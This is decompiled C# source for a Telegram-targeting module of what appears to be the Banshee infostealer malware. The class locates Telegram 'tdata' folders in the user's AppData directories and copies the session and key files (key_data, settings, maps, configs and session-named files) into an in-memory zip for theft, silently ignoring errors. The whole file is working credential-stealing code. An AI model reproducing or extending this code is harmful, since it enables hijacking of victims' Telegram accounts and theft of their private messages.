﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Banshee.Helper;
using Banshee.Helper.Data;

namespace Banshee.Targets.Messangers
{
	// Token: 0x02000046 RID: 70
	public class Telegram : ITarget
	{
		// Token: 0x0600009F RID: 159 RVA: 0x00005714 File Offset: 0x00005714
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Telegram";
			List<string> list = this.FindAllMatches("tdata");
			Dictionary<string, int> suffixes = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
			foreach (string text in list)
			{
				string targetPath = Path.Combine(Telegram.GetProfileFolderName(text, suffixes), "tdata");
				this.Copydata(text, targetPath, zip, counterApplications);
			}
			if (counterApplications.Files.Count > 0)
			{
				counter.Messangers.Add(counterApplications);
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x000057BC File Offset: 0x000057BC
		private static string GetProfileFolderName(string tdataPath, Dictionary<string, int> suffixes)
		{
			if (string.IsNullOrWhiteSpace(tdataPath))
			{
				return "telegram";
			}
			string text = "telegram";
			try
			{
				DirectoryInfo parent = new DirectoryInfo(tdataPath).Parent;
				if (parent != null && !string.IsNullOrWhiteSpace(parent.Name))
				{
					text = parent.Name;
				}
			}
			catch
			{
			}
			string result;
			lock (suffixes)
			{
				int num;
				if (!suffixes.TryGetValue(text, out num))
				{
					suffixes[text] = 0;
					result = text;
				}
				else
				{
					num++;
					suffixes[text] = num;
					result = text + "_" + num.ToString();
				}
			}
			return result;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00005878 File Offset: 0x00005878
		private void AddIfMatch(FileInfo fileInfo, string entryPath, InMemoryZip zip)
		{
			string name = fileInfo.Name;
			if (name.EndsWith("s") && name.Length == 17)
			{
				zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
				return;
			}
			if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data") || name.StartsWith("configs") || name.StartsWith("maps"))
			{
				zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
			}
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x0000590C File Offset: 0x0000590C
		private void Copydata(string sourceDir, string targetPath, InMemoryZip zip, Counter.CounterApplications counterApplications)
		{
			ConcurrentBag<string> matchedNames = new ConcurrentBag<string>();
			bool addedAny = false;
			Parallel.ForEach<string>(Directory.GetFiles(sourceDir), delegate(string filePath)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(filePath);
					if (fileInfo.Length <= 7120L)
					{
						string entryPath = ZipPath.Messengers(Path.Combine(targetPath, fileInfo.Name));
						if (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17)
						{
							matchedNames.Add(fileInfo.Name);
						}
						int count = counterApplications.Files.Count;
						this.AddIfMatch(fileInfo, entryPath, zip);
						if ((fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17) || fileInfo.Name.StartsWith("usertag") || fileInfo.Name.StartsWith("settings") || fileInfo.Name.StartsWith("key_data") || fileInfo.Name.StartsWith("configs") || fileInfo.Name.StartsWith("maps"))
						{
							addedAny = true;
						}
					}
				}
				catch
				{
				}
			});
			Parallel.ForEach<string>(matchedNames, delegate(string name)
			{
				try
				{
					string dirPath = Path.Combine(sourceDir, name);
					dirPath = dirPath.Remove(dirPath.Length - 1);
					if (Directory.Exists(dirPath))
					{
						Parallel.ForEach<string>(Directory.GetFiles(dirPath), delegate(string filePath)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(filePath);
								if (fileInfo.Length <= 7120L)
								{
									string entryPath = ZipPath.Messengers(Path.Combine(targetPath, Path.GetFileName(dirPath), fileInfo.Name));
									this.AddIfMatch(fileInfo, entryPath, zip);
									if ((fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17) || fileInfo.Name.StartsWith("usertag") || fileInfo.Name.StartsWith("settings") || fileInfo.Name.StartsWith("key_data") || fileInfo.Name.StartsWith("configs") || fileInfo.Name.StartsWith("maps"))
									{
										addedAny = true;
									}
								}
							}
							catch
							{
							}
						});
					}
				}
				catch
				{
				}
			});
			if (addedAny)
			{
				counterApplications.Files.Add(sourceDir + " => " + targetPath);
			}
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x000059B8 File Offset: 0x000059B8
		private List<string> FindInAppData(string folderName)
		{
			if (string.IsNullOrEmpty(folderName))
			{
				return new List<string>();
			}
			ConcurrentDictionary<string, byte> found = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
			Action<string> <>9__0;
			foreach (string text in new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			})
			{
				if (!string.IsNullOrEmpty(text) && Directory.Exists(text))
				{
					try
					{
						IEnumerable<string> source = Directory.EnumerateDirectories(text, "*", SearchOption.TopDirectoryOnly);
						Action<string> body;
						if ((body = <>9__0) == null)
						{
							body = (<>9__0 = delegate(string dir1)
							{
								try
								{
									string path = Path.Combine(dir1, folderName);
									if (Directory.Exists(path))
									{
										found.TryAdd(Path.GetFullPath(path), 0);
									}
								}
								catch
								{
								}
							});
						}
						Parallel.ForEach<string>(source, body);
					}
					catch
					{
					}
				}
			}
			return new List<string>(found.Keys);
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00005A8C File Offset: 0x00005A8C
		private List<string> FindAllMatches(string folderName)
		{
			ConcurrentDictionary<string, byte> set = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
			Parallel.ForEach<string>(ProcessWindows.FindFolder(folderName), delegate(string p)
			{
				set.TryAdd(p, 0);
			});
			Parallel.ForEach<string>(this.FindInAppData(folderName), delegate(string p)
			{
				set.TryAdd(p, 0);
			});
			return new List<string>(set.Keys);
		}
	}
}
